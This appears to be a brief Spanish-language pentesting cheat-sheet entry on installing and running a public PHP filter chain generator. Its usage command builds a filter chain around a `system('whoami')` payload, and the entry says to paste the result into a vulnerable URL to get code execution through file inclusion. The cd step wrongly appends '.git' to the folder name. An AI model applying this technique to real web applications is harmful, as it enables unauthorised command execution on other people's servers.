- [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)

## Instalacion
```
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator.git
```

## Uso
```
python3 php_filter_chain_generator.py --chain "<?php system('whoami'); ?>"
```
- Copias el texto y lo pegas en la url vulnerable